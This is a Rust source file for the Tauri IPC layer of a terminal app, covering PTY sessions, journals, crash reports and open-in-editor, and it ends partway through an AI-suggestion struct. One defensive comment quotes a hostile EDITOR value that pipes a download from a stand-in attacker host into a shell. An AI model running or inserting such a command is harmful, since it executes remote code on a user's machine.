//! IPC façade — Tauri commands + event topics consumed by the TS bridge.
//!
//! Kept intentionally small. The shape here is what the real `quanta-core`
//! sidecar will mirror over its JSON-RPC channel (see ADR 0004). Adding a new
//! command requires adding the corresponding TS wrapper in `packages/host-tauri`
//! and typing it in `@quanta/host-common`.
//!
//! Event name convention
//! ---------------------
//! Topics use a hyphen in the last segment (`quanta://pty-data`, not
//! `quanta://pty.data`). Tauri 2 emits a runtime warning for event names that
//! contain `.`; the canonical form mirrors the command name style so a single
//! naming policy covers both planes.

use std::collections::HashMap;
use std::fs;
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
#[cfg(feature = "embedded-shell")]
use tauri::Emitter;
use tauri::{AppHandle, State};

#[cfg_attr(not(test), allow(unused_imports))]
use crate::error::ErrorCode;
use crate::error::TauriError;
use crate::flow_control::FlowControl;

#[cfg(feature = "embedded-shell")]
use crate::embedded_shell::{EmbeddedShell, SpawnedSession};

/// Topic emitted per PTY output chunk.
pub const EVENT_PTY_DATA: &str = "quanta://pty-data";
/// Topic emitted when a PTY exits.
pub const EVENT_PTY_EXIT: &str = "quanta://pty-exit";

/// Opaque session id shared with the TS side.
pub type SessionId = String;

pub struct AppState {
    sessions: Mutex<HashMap<SessionId, Arc<SessionHandle>>>,
    /// Populated by `lib::run()`'s setup hook on the `sidecar` feature. Held
    /// as `Arc<Mutex<...>>` so the async setup task can mutate the slot
    /// concurrently with live Tauri command handlers.
    #[cfg(feature = "sidecar")]
    sidecar: Arc<Mutex<Option<Arc<crate::sidecar::SidecarBridge>>>>,
    /// Shared [`quanta_ai::SuggestionProvider`]. Built once at startup:
    /// `AnthropicProvider` when `ANTHROPIC_API_KEY` is set, otherwise the
    /// offline `MockProvider`. Held as `Arc<dyn …>` so the IPC handler never
    /// has to branch on which implementation it is calling.
    suggestion_provider: Arc<dyn quanta_ai::SuggestionProvider>,
    /// Per-session session-restore journals (Plan 0005 P1-E). Populated by
    /// `quanta_session_journal_start`; the PTY data pump writes through the
    /// handle on every chunk; `quanta_session_journal_stop` drops the entry
    /// after flushing. Held in a `Mutex<HashMap<…>>` because PTY reader
    /// threads read (clone) the handle on every chunk; the IPC commands
    /// insert / remove rarely, so contention is negligible.
    journals: Arc<Mutex<HashMap<SessionId, crate::session_record::SessionJournal>>>,
}

impl AppState {
    pub fn new() -> Self {
        Self {
            sessions: Mutex::new(HashMap::new()),
            #[cfg(feature = "sidecar")]
            sidecar: Arc::new(Mutex::new(None)),
            suggestion_provider: build_default_suggestion_provider(),
            journals: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Clone the journals slot so the embedded-shell wiring can read-through
    /// without taking a Tauri `State<'_, AppState>` (which is not available
    /// to the `std::thread::spawn`'d reader thread).
    pub fn journals_handle(&self) -> Arc<Mutex<HashMap<SessionId, crate::session_record::SessionJournal>>> {
        self.journals.clone()
    }

    /// Clone the sidecar slot handle so the async setup task can populate
    /// it without owning `AppState`.
    #[cfg(feature = "sidecar")]
    pub fn sidecar_slot_arc(&self) -> Arc<Mutex<Option<Arc<crate::sidecar::SidecarBridge>>>> {
        self.sidecar.clone()
    }

    #[cfg(feature = "sidecar")]
    fn sidecar_handle(&self) -> Option<Arc<crate::sidecar::SidecarBridge>> {
        self.sidecar.lock().clone()
    }
}

/// Construct the app-wide suggestion provider.
///
/// Security boundary: we read `ANTHROPIC_API_KEY` here and nowhere else. The
/// `quanta-ai` crate intentionally refuses to read env vars itself so the key
/// never flows through a library API that could be exercised from a test. If
/// the env var is unset we fall back to the deterministic `MockProvider`
/// (same behavior as before Phase 6, so dev / CI stay offline).
fn build_default_suggestion_provider() -> Arc<dyn quanta_ai::SuggestionProvider> {
    match std::env::var("ANTHROPIC_API_KEY") {
        Ok(key) if !key.trim().is_empty() => {
            tracing::info!("ai-suggest: ANTHROPIC_API_KEY set; using live AnthropicProvider");
            Arc::new(quanta_ai::AnthropicProvider::new(key))
        }
        _ => {
            tracing::info!("ai-suggest: no ANTHROPIC_API_KEY; falling back to MockProvider");
            Arc::new(quanta_ai::MockProvider::new())
        }
    }
}

/// A live session. In Phase 1 this wraps an embedded PTY directly; when the
/// real sidecar arrives this becomes a handle on an RPC session id.
#[allow(
    dead_code,
    reason = "shell/cwd retained for list_sessions RPC once it lands"
)]
pub struct SessionHandle {
    pub shell: String,
    pub cwd: String,
    #[cfg(feature = "embedded-shell")]
    pub embedded: Arc<SpawnedSession>,
    /// Per-session PTY flow-control gate (Plan 0005 Epic γ). The embedded
    /// shell reader thread calls `block_if_paused` before each `read`; the
    /// `quanta_pause_pty` / `quanta_resume_pty` IPC commands flip the
    /// underlying flag. Always present so the command handlers never have to
    /// branch on "is there flow control" — unused in the sidecar path (the
    /// sidecar owns its own byte pump) but zero-cost when not flipped.
    pub flow_control: FlowControl,
}

/* -------------------- command payloads -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct SpawnArgs {
    pub shell: Option<String>,
    pub cwd: Option<String>,
    pub cols: u16,
    pub rows: u16,
    /// Per-session env overrides. Only the embedded-shell path consumes these
    /// directly today; the sidecar path routes CreateSession through
    /// `quanta-core`, which ignores this field (env is the core's concern).
    #[allow(
        dead_code,
        reason = "used only under `embedded-shell`; retained in the wire shape so the TS bridge keeps one payload type across features"
    )]
    pub env: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "snake_case")]
pub struct SpawnReply {
    pub session_id: SessionId,
    pub shell: String,
    pub cwd: String,
    /// `true` when the host kernel is the Linux shim embedded in Windows —
    /// Windows Subsystem for Linux (WSL 1 or 2). Detected by probing
    /// `/proc/version` for "Microsoft" / "WSL" tokens; see
    /// [`crate::embedded_shell::is_wsl_from_proc_version`]. The UI reads this
    /// to surface a WSL badge on the status bar so users who cross-mount
    /// Windows drives under `/mnt/` see at a glance which kernel they are
    /// talking to.
    pub is_wsl: bool,
}

#[derive(Debug, Serialize, Clone)]
#[serde(rename_all = "snake_case")]
pub struct DataEvent {
    pub session_id: SessionId,
    pub seq: u64,
    pub bytes_b64: String,
}

#[derive(Debug, Serialize, Clone)]
#[serde(rename_all = "snake_case")]
pub struct ExitEvent {
    pub session_id: SessionId,
    pub exit_code: Option<i32>,
    pub signal: Option<String>,
}

/* -------------------- commands -------------------- */

#[tauri::command]
pub async fn quanta_ready() -> Result<(), String> {
    tracing::debug!("quanta_ready");
    Ok(())
}

/// TS → Rust crash-forward entry point. Accepts a flat record produced by
/// the TS `postCrashReport` hook (see `packages/host-tauri/src/main.tsx`)
/// and feeds it into the host's crash reporter. The reporter is
/// fail-silent at its boundary; this command therefore always resolves
/// `Ok(())` even if the sink IO errored — otherwise the TS side would
/// surface the write failure as a new unhandled rejection and we'd loop.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct CrashReportInput {
    pub kind: String,
    pub message: String,
    pub stack: Option<String>,
    /// Free-form origin tag; mainly `"ts.unhandled"` today.
    pub origin: Option<String>,
}

#[tauri::command]
pub async fn quanta_report_crash(report: CrashReportInput) -> Result<(), String> {
    let kind = report.origin.unwrap_or_else(|| report.kind.clone());
    crate::crash::forward_ts_crash(&kind, &report.message, report.stack.as_deref());
    Ok(())
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_spawn_session(
    args: SpawnArgs,
    app: AppHandle,
    state: State<'_, AppState>,
) -> Result<SpawnReply, TauriError> {
    let session_id = uuid::Uuid::new_v4().to_string();
    tracing::info!(%session_id, ?args, "spawn session");

    #[cfg(feature = "sidecar")]
    {
        let _ = app;
        let bridge = state
            .sidecar_handle()
            .ok_or_else(|| TauriError::sidecar_unavailable("quanta-core not connected"))?;
        let (shell, cwd) = bridge
            .spawn_session(
                &session_id,
                args.shell.clone(),
                args.cwd.clone(),
                args.cols,
                args.rows,
            )
            .await
            .map_err(|e| TauriError::bridge_internal(format!("sidecar spawn failed: {e}")))?;
        state.sessions.lock().insert(
            session_id.clone(),
            Arc::new(SessionHandle {
                shell: shell.clone(),
                cwd: cwd.clone(),
                // Sidecar path: the sidecar owns its own byte pump, so this
                // gate is never consulted. We still attach one so the IPC
                // commands have a uniform target — flipping it is a no-op
                // for the sidecar's read path but keeps the types clean.
                flow_control: FlowControl::new(),
            }),
        );
        return Ok(SpawnReply {
            session_id,
            shell,
            cwd,
            // Sidecar path: the sidecar itself runs inside the host kernel,
            // so WSL detection runs on the Tauri process (same kernel the
            // sidecar forked from).
            is_wsl: crate::embedded_shell::is_wsl(),
        });
    }

    #[cfg(feature = "embedded-shell")]
    {
        let handle = EmbeddedShell::spawn(
            &session_id,
            args.shell.clone(),
            args.cwd.clone(),
            args.cols,
            args.rows,
            args.env.clone().unwrap_or_default(),
        )
        .map_err(|e| TauriError::bridge_internal(format!("spawn failed: {e}")))?;

        let shell = handle.shell_label.clone();
        let cwd = handle.cwd.clone();
        let spawned = Arc::new(handle);
        let flow_control = FlowControl::new();

        wire_events(
            app.clone(),
            session_id.clone(),
            spawned.clone(),
            flow_control.clone(),
            state.journals_handle(),
        );

        state.sessions.lock().insert(
            session_id.clone(),
            Arc::new(SessionHandle {
                shell: shell.clone(),
                cwd: cwd.clone(),
                embedded: spawned,
                flow_control,
            }),
        );

        return Ok(SpawnReply {
            session_id,
            shell,
            cwd,
            is_wsl: crate::embedded_shell::is_wsl(),
        });
    }

    #[cfg(not(any(feature = "embedded-shell", feature = "sidecar")))]
    {
        let _ = (app, state);
        Err(TauriError::sidecar_unavailable(
            "no shell backend: rebuild with embedded-shell or sidecar feature",
        ))
    }
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_write(
    session_id: SessionId,
    data: String,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    #[cfg(feature = "sidecar")]
    {
        let bridge = state
            .sidecar_handle()
            .ok_or_else(|| TauriError::sidecar_unavailable("quanta-core not connected"))?;
        bridge.write(&session_id, data.as_bytes()).await.map_err(|e| {
            let msg = format!("{e:#}");
            if msg.to_lowercase().contains("unknown session") {
                TauriError::session_not_found(&session_id)
            } else {
                TauriError::bridge_internal(format!("sidecar write failed: {msg}"))
            }
        })?;
        return Ok(());
    }

    #[cfg(feature = "embedded-shell")]
    {
        let handle = state
            .sessions
            .lock()
            .get(&session_id)
            .cloned()
            .ok_or_else(|| TauriError::session_not_found(&session_id))?;
        handle
            .embedded
            .write(data.as_bytes())
            .map_err(|e| TauriError::bridge_internal(format!("write failed: {e}")))?;
        return Ok(());
    }

    #[cfg(not(any(feature = "embedded-shell", feature = "sidecar")))]
    {
        let _ = (state, data, session_id);
        Err(TauriError::sidecar_unavailable(
            "write unavailable without embedded-shell or sidecar feature",
        ))
    }
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_resize(
    session_id: SessionId,
    cols: u16,
    rows: u16,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    #[cfg(feature = "sidecar")]
    {
        let bridge = state
            .sidecar_handle()
            .ok_or_else(|| TauriError::sidecar_unavailable("quanta-core not connected"))?;
        bridge.resize(&session_id, cols, rows).await.map_err(|e| {
            let msg = format!("{e:#}");
            if msg.to_lowercase().contains("unknown session") {
                TauriError::session_not_found(&session_id)
            } else {
                TauriError::bridge_internal(format!("sidecar resize failed: {msg}"))
            }
        })?;
        return Ok(());
    }

    #[cfg(feature = "embedded-shell")]
    {
        let handle = state
            .sessions
            .lock()
            .get(&session_id)
            .cloned()
            .ok_or_else(|| TauriError::session_not_found(&session_id))?;
        handle
            .embedded
            .resize(cols, rows)
            .map_err(|e| TauriError::bridge_internal(format!("resize failed: {e}")))?;
        return Ok(());
    }

    #[cfg(not(any(feature = "embedded-shell", feature = "sidecar")))]
    {
        let _ = (state, cols, rows, session_id);
        Ok(())
    }
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_cancel_block(
    session_id: SessionId,
    block_id: String,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    // Idempotency guarantee (ADR 0004): cancelling a block that has already
    // reached a terminal state must resolve silently rather than surface an
    // error, matching the sidecar's `CancelBlock` semantics. The UI may
    // double-fire this during a Stop button race and we don't want toasts
    // for a no-op.
    //
    // FIX 2: classification now first converts the low-level error into a
    // `TauriError` (which assigns a semantic `ErrorCode`) and then swallows
    // any code that represents an idempotent-terminal state. Callers used to
    // string-match on substrings of the message; code-match is the durable
    // replacement.
    #[cfg(feature = "sidecar")]
    {
        let bridge = match state.sidecar_handle() {
            Some(b) => b,
            None => return Ok(()),
        };
        if let Err(err) = bridge.cancel(&session_id, &block_id).await {
            let msg = format!("{err:#}");
            match classify_cancel_error(&msg, &session_id) {
                CancelOutcome::Idempotent => {
                    tracing::debug!(%session_id, %block_id, %msg, "cancel: ignoring idempotent error");
                    return Ok(());
                }
                CancelOutcome::Propagate(e) => return Err(e),
            }
        }
        return Ok(());
    }

    #[cfg(not(feature = "sidecar"))]
    {
        let _ = (state, session_id, block_id);
        // Embedded-shell is a dev-only single-PTY path; there's no block
        // surface to cancel. Surface a toast-friendly TauriError.
        Err(TauriError::bridge_internal(
            "cancel not supported in embedded-shell mode",
        ))
    }
}

/// Outcome of classifying a sidecar cancel error. Keeps the "swallow
/// silently" decision out of the call site so the test harness can pin the
/// mapping without reconstructing the match arms. Replaces the pre-FIX-2
/// string-matching classifier that lived inline in `quanta_cancel_block`.
#[derive(Debug)]
#[cfg_attr(not(feature = "sidecar"), allow(dead_code))]
pub(crate) enum CancelOutcome {
    /// The error represents an already-terminal state (unknown session,
    /// block already completed / terminated / not found). The Stop button is
    /// idempotent — we resolve `Ok(())` and do NOT toast.
    Idempotent,
    /// Real failure — propagate as a `TauriError` the UI can branch on.
    Propagate(TauriError),
}

/// Classify a sidecar cancel error. Pure — no Tauri / async state — so unit
/// tests pin the mapping without a live sidecar. `session-not-found` and the
/// "already terminal" substring class are both folded into `Idempotent`;
/// anything else propagates as a typed `bridge-internal` error with the
/// detail preserved in context.
#[cfg_attr(not(any(feature = "sidecar", test)), allow(dead_code))]
pub(crate) fn classify_cancel_error(msg: &str, _session_id: &str) -> CancelOutcome {
    let lower = msg.to_lowercase();
    if lower.contains("unknown session")
        || lower.contains("already")
        || lower.contains("not found")
        || lower.contains("not_found")
        || lower.contains("terminated")
        || lower.contains("completed")
    {
        return CancelOutcome::Idempotent;
    }
    CancelOutcome::Propagate(TauriError::bridge_internal(format!(
        "sidecar cancel failed: {msg}"
    )))
}

#[tauri::command]
pub async fn quanta_close(
    session_id: SessionId,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    // Plan 0005 P1-E: flush the session-restore journal before tearing down
    // the session so the tail reaches disk. We remove + drop the handle —
    // subsequent PTY chunks (if any race in after `close` returns) go
    // through the no-journal branch.
    if let Some(j) = state.journals.lock().remove(&session_id) {
        if let Err(err) = j.stop() {
            tracing::warn!(?err, session_id = %session_id, "journal stop on close failed");
        }
    }
    let handle = state.sessions.lock().remove(&session_id);
    #[cfg(feature = "sidecar")]
    {
        if let Some(bridge) = state.sidecar_handle() {
            if let Err(err) = bridge.close(&session_id).await {
                tracing::warn!(?err, "sidecar close failed; already removed locally");
            }
        }
    }
    if let Some(h) = handle {
        #[cfg(feature = "embedded-shell")]
        {
            h.embedded.kill();
        }
        #[cfg(not(feature = "embedded-shell"))]
        {
            let _ = h;
        }
    }
    Ok(())
}

/* -------------------- PTY flow control (Plan 0005 γ5) -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PausePtyArgs {
    /// The session whose reader we want to park. Looked up in `AppState.sessions`.
    pub session_id: SessionId,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ResumePtyArgs {
    pub session_id: SessionId,
}

/// Signal the per-session PTY reader to pause.
///
/// Invoked from TS when the frame-skip batcher's queued-bytes gauge crosses
/// `softCapBytes` (default 128 MiB). The reader parks on a Condvar between
/// PTY `read()` calls, which lets the kernel PTY buffer fill up and pushes
/// backpressure to the child process via its `write(2)` path.
///
/// Idempotent: pausing an already-paused session is a no-op. Calling on an
/// unknown session is treated as a silent success — the TS batcher may race
/// against `close()`, and a `session-not-found` toast on the pause path would
/// be actively misleading (the user did nothing wrong).
#[tauri::command]
pub async fn quanta_pause_pty(
    args: PausePtyArgs,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    let handle = state.sessions.lock().get(&args.session_id).cloned();
    match handle {
        Some(h) => {
            tracing::debug!(session_id = %args.session_id, "pause_pty: parking reader");
            h.flow_control.pause();
        }
        None => {
            // Benign race: session already closed on our side. The TS side
            // will tear down on the next pty_exit event; surfacing an error
            // here would surface a phantom toast.
            tracing::debug!(
                session_id = %args.session_id,
                "pause_pty: unknown session; ignoring (likely closed)"
            );
        }
    }
    Ok(())
}

/// Signal the per-session PTY reader to resume.
///
/// Invoked from TS when the batcher's queue drains below 75 % of the soft
/// cap. Idempotent: resuming a running session is a no-op. Same "unknown
/// session = silent success" contract as [`quanta_pause_pty`].
#[tauri::command]
pub async fn quanta_resume_pty(
    args: ResumePtyArgs,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    let handle = state.sessions.lock().get(&args.session_id).cloned();
    match handle {
        Some(h) => {
            tracing::debug!(session_id = %args.session_id, "resume_pty: waking reader");
            h.flow_control.resume();
        }
        None => {
            tracing::debug!(
                session_id = %args.session_id,
                "resume_pty: unknown session; ignoring (likely closed)"
            );
        }
    }
    Ok(())
}

/* -------------------- session restore journal (Plan 0005 P1-E) -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct JournalStartArgs {
    pub session_id: SessionId,
    pub cols: u16,
    pub rows: u16,
    pub shell: Option<String>,
    pub cwd: Option<String>,
    /// Optional explicit directory override (tests / CLI). Production
    /// callers leave this null so the default `~/.config/quanta/session-restore`
    /// is used. Validated against path traversal inside the resolver.
    pub dir_override: Option<String>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "snake_case")]
pub struct JournalStartReply {
    pub path: String,
    pub created_at_ms: i64,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct JournalStopArgs {
    pub session_id: SessionId,
}

/// Begin a per-session restore journal.
///
/// Idempotent: calling twice on the same session overwrites the previous
/// journal (caller presumably lost the handle or re-spawned). The PTY reader
/// thread picks up the new journal on its next chunk because it reads the
/// slot through `journals_handle()` per chunk.
#[tauri::command]
pub async fn quanta_session_journal_start(
    args: JournalStartArgs,
    app: AppHandle,
    state: State<'_, AppState>,
) -> Result<JournalStartReply, TauriError> {
    let dir = resolve_journal_dir(&app, args.dir_override.as_deref())?;
    let shell = args.shell.as_deref().unwrap_or("");
    let cwd = args.cwd.as_deref().unwrap_or("");
    let journal = crate::session_record::SessionJournal::open(
        &dir,
        &args.session_id,
        args.cols,
        args.rows,
        shell,
        cwd,
    )
    .map_err(|e| TauriError::bridge_internal(format!("journal open failed: {e}")))?;
    let path = crate::session_record::journal_path(&dir, &args.session_id);
    state
        .journals
        .lock()
        .insert(args.session_id.clone(), journal);
    tracing::info!(session_id = %args.session_id, path = %path.display(), "journal started");
    Ok(JournalStartReply {
        path: path.to_string_lossy().into_owned(),
        created_at_ms: chrono_now_ms(),
    })
}

/// Flush + drop the per-session journal.
///
/// Silent on unknown sessions (benign race with `close()`), same contract as
/// `quanta_pause_pty`.
#[tauri::command]
pub async fn quanta_session_journal_stop(
    args: JournalStopArgs,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    let removed = state.journals.lock().remove(&args.session_id);
    if let Some(j) = removed {
        if let Err(err) = j.stop() {
            tracing::warn!(?err, session_id = %args.session_id, "journal stop failed");
        }
    }
    Ok(())
}

/// Read every rotated tail + the active `.qrpl` for a session in chronological
/// order (oldest first). Plan 0005 P1-E / W2-D — closes the session-restore
/// Tauri port so `createTauriJournalPort(invoke)` in
/// `features/session-restore/journal-port.ts` can load real journal bytes.
///
/// Contract:
///   - Missing journal directory → empty array (UI treats missing identically
///     to "no journal"; this must not surface as an error).
///   - A partial read of any single file (I/O error mid-read) skips that file
///     and continues; the rest are still returned. Replay engine handles
///     truncated-tail correctly via its frame-level FSM.
///   - Each entry is a full `.qrpl` file (header + frames), base64-encoded so
///     the Tauri JSON bridge carries it losslessly. 50 MiB per file × up to 5
///     files (4 rotated + active) = 250 MiB worst-case — within the invoke
///     ABI envelope.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct JournalReadArgs {
    pub session_id: SessionId,
    pub dir_override: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct JournalReadEntry {
    pub bytes_b64: String,
}

#[tauri::command]
pub async fn quanta_session_journal_read(
    args: JournalReadArgs,
    app: AppHandle,
) -> Result<Vec<JournalReadEntry>, TauriError> {
    use base64::Engine as _;

    let dir = resolve_journal_dir(&app, args.dir_override.as_deref())?;
    if !dir.exists() {
        return Ok(Vec::new());
    }
    let paths = crate::session_record::rotated_paths(&dir, &args.session_id);
    let mut out: Vec<JournalReadEntry> = Vec::with_capacity(paths.len());
    for path in paths {
        match fs::read(&path) {
            Ok(bytes) => {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
                out.push(JournalReadEntry { bytes_b64: b64 });
            }
            Err(err) => {
                // A per-file read error is not fatal — the caller handles
                // short tails already, and a disk-full scenario mid-rotation
                // shouldn't abort the whole load.
                tracing::warn!(
                    ?err,
                    session_id = %args.session_id,
                    path = %path.display(),
                    "journal file read failed; skipping"
                );
            }
        }
    }
    Ok(out)
}

fn resolve_journal_dir(app: &AppHandle, dir_override: Option<&str>) -> Result<PathBuf, TauriError> {
    if let Some(raw) = dir_override {
        // Tests pass an explicit directory; reject traversal to keep the
        // surface safe even when exposed in debug builds.
        let p = PathBuf::from(raw);
        if raw.is_empty() || raw.contains("..") {
            return Err(TauriError::bridge_internal("journal dir_override rejected"));
        }
        return Ok(p);
    }
    // Tauri's app_config_dir is the canonical per-user profile dir; falls
    // through to `$HOME/.config/quanta` which is what the crash marker uses.
    use tauri::Manager as _;
    if let Ok(base) = app.path().app_config_dir() {
        return Ok(base.join("session-restore"));
    }
    if let Some(home) = std::env::var_os("HOME") {
        return Ok(PathBuf::from(home).join(".config/quanta/session-restore"));
    }
    Err(TauriError::bridge_internal(
        "no HOME / config dir for journal",
    ))
}

fn chrono_now_ms() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/* -------------------- open-in-editor -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct OpenInEditorArgs {
    pub path: String,
    pub line: Option<u32>,
    pub column: Option<u32>,
}

/// Reject paths the OS/editor chain must not receive verbatim.
///
/// The TS layer already filters control characters (see
/// `features/navigation/open-in-editor`); this server-side check is the
/// defense-in-depth mirror so a rogue/bypassed frontend cannot ship an
/// argv-injection vector to the editor CLI. We deliberately DO NOT do any
/// shell interpretation — the editor is always spawned with
/// `Command::new(editor).arg(…)`, never `sh -c`.
pub fn validate_editor_path(path: &str) -> Result<(), String> {
    if path.is_empty() {
        return Err("open-in-editor: path is empty".into());
    }
    for (offset, ch) in path.char_indices() {
        if (ch as u32) < 0x20 || ch == '\x7f' {
            return Err(format!(
                "open-in-editor: path contains control character at offset {offset}"
            ));
        }
        if ch == '\0' {
            return Err("open-in-editor: path contains NUL".into());
        }
        // Newlines would turn a file path into an extra argv element on some
        // editor CLIs that accept stdin-style path lists; reject outright.
        if ch == '\n' || ch == '\r' {
            return Err("open-in-editor: path contains newline".into());
        }
    }
    Ok(())
}

fn which_editor(bin: &str) -> Option<PathBuf> {
    let path_env = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path_env) {
        let candidate = dir.join(bin);
        if candidate.is_file() {
            return Some(candidate);
        }
    }
    None
}

/// Pick an editor binary from a hardcoded preference chain.
///
/// Order:
///   1. `code` (VS Code)
///   2. `cursor` (Cursor)
///   3. `subl` (Sublime)
///   4. `$VISUAL` or `$EDITOR` (resolved only to a bare binary path — we do
///      NOT honor a shell-interpreted `$EDITOR=vi -u NONE` and we reject
///      anything that is not an existing file on `PATH`).
///
/// Returns `(binary_path, supports_line_goto)` so the caller knows whether
/// to pass `-g path:line:col` or a plain path.
fn resolve_editor() -> Option<(PathBuf, bool)> {
    for (bin, supports_goto) in [("code", true), ("cursor", true), ("subl", false)] {
        if let Some(path) = which_editor(bin) {
            return Some((path, supports_goto));
        }
    }
    // $VISUAL / $EDITOR — only honor the first token and only when it
    // resolves on PATH. This guards against a hostile env that sets
    // `EDITOR=sh -c "curl evil.com | sh"`.
    for var in ["VISUAL", "EDITOR"] {
        if let Ok(raw) = std::env::var(var) {
            let first = raw.split_whitespace().next().unwrap_or("");
            if first.is_empty() {
                continue;
            }
            // Disallow absolute paths outside of PATH resolution so we don't
            // become a gadget for launching arbitrary binaries the user never
            // vetted. We accept a bare name like `nvim` and resolve via PATH.
            if first.contains('/') || first.contains('\\') {
                continue;
            }
            if let Some(path) = which_editor(first) {
                return Some((path, false));
            }
        }
    }
    None
}

#[tauri::command]
pub async fn quanta_open_in_editor(args: OpenInEditorArgs) -> Result<(), TauriError> {
    if let Err(reason) = validate_editor_path(&args.path) {
        return Err(TauriError::editor_invalid_path(&reason));
    }

    // Require absolute paths. The TS layer resolves relative paths against the
    // session cwd before calling us (see `features/navigation/open-in-editor`),
    // so a relative path reaching Rust is a programming error worth refusing.
    let as_path = Path::new(&args.path);
    if !as_path.is_absolute() {
        return Err(TauriError::editor_invalid_path(
            "path must be absolute",
        ));
    }

    let (editor_bin, supports_goto) = resolve_editor().ok_or_else(TauriError::editor_not_found)?;

    tracing::info!(?editor_bin, supports_goto, path = %args.path, line = ?args.line, "open-in-editor");

    let mut cmd = Command::new(&editor_bin);
    // Detach from Tauri's process group so a long-lived editor doesn't tie
    // the app's lifetime to the editor's (and vice-versa on kill).
    if supports_goto && args.line.is_some() {
        let line = args.line.unwrap_or(1);
        let column = args.column.unwrap_or(1);
        cmd.arg("-g")
            .arg(format!("{}:{}:{}", args.path, line, column));
    } else {
        cmd.arg(&args.path);
    }

    cmd.spawn().map_err(|e| {
        let detail = format!(
            "spawn {:?} failed: {e}",
            editor_bin.file_name().unwrap_or_default(),
        );
        // "Permission denied" from the editor binary is almost always a
        // stale path (editor was uninstalled, or the bundled stub is not
        // executable). Surface it as `editor-invalid-path` so the UI can
        // show a targeted toast rather than "internal error".
        if detail.to_lowercase().contains("permission denied") {
            TauriError::editor_invalid_path(&detail)
        } else {
            TauriError::bridge_internal(detail)
        }
    })?;
    Ok(())
}

/* -------------------- wiring -------------------- */

#[cfg(feature = "embedded-shell")]
fn wire_events(
    app: AppHandle,
    session_id: SessionId,
    spawned: Arc<SpawnedSession>,
    flow_control: FlowControl,
    journals: Arc<Mutex<HashMap<SessionId, crate::session_record::SessionJournal>>>,
) {
    // Data pump: drain PTY -> emit `quanta://pty.data`.
    //
    // Flow-control gate: before each read we park on `flow_control` if the
    // TS side has called `bridge.pausePty(sessionId)`. While parked, we do
    // NOT consume any bytes from the kernel PTY buffer — that buffer fills
    // up (typical 4–64 KiB on Linux/macOS), which transparently blocks the
    // child's next `write`, pushing backpressure all the way to the producer.
    // The `block_if_paused` timeout (250 ms) bounds how long we can stay
    // parked before re-checking the PTY state; it lets the reader still
    // notice a closed PTY / killed child even while the UI is paused. A
    // fresh `pause()` inside the 250 ms window is observed on the next loop
    // iteration, so the timeout never lets bytes slip through.
    let app_data = app.clone();
    let sid_data = session_id.clone();
    let spawned_data = spawned.clone();
    let fc_data = flow_control.clone();
    std::thread::spawn(move || {
        use base64::Engine as _;
        let mut seq: u64 = 0;
        let mut buf = [0u8; 8192];
        loop {
            // Park (if needed) BEFORE reading so we don't pre-fetch bytes
            // that would then have to be held in our thread. 250 ms is a
            // compromise between "wake fast enough on resume" (Condvar does)
            // and "notice PTY death periodically" (we also get EOF via the
            // read itself once resume fires and the child has exited).
            fc_data.block_if_paused(std::time::Duration::from_millis(250));
            match spawned_data.read(&mut buf) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    // Plan 0005 P1-E: tee the chunk into the session-restore
                    // journal if one is active. The lookup is O(1) on a small
                    // hash map; the journal itself holds an `Arc<Mutex<…>>`
                    // so write_chunk returns quickly. We do NOT fail the data
                    // path on journal errors — write_chunk logs and drops.
                    if let Some(j) = journals.lock().get(&sid_data).cloned() {
                        j.write_chunk(&buf[..n]);
                    }
                    let b64 = base64::engine::general_purpose::STANDARD.encode(&buf[..n]);
                    let payload = DataEvent {
                        session_id: sid_data.clone(),
                        seq,
                        bytes_b64: b64,
                    };
                    if app_data.emit(EVENT_PTY_DATA, payload).is_err() {
                        break;
                    }
                    seq = seq.saturating_add(1);
                }
                Err(err) => {
                    tracing::warn!(%err, "pty read error; ending data pump");
                    break;
                }
            }
        }
    });

    // Exit watcher.
    let app_exit = app.clone();
    let sid_exit = session_id;
    let spawned_exit = spawned;
    std::thread::spawn(move || {
        let exit_code = spawned_exit.wait_exit();
        let payload = ExitEvent {
            session_id: sid_exit,
            exit_code,
            signal: None,
        };
        let _ = app_exit.emit(EVENT_PTY_EXIT, payload);
    });
}

/* -------------------- AI suggestion flow (ADR 0012) -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct AiSuggestArgs {
    pub prompt: String,
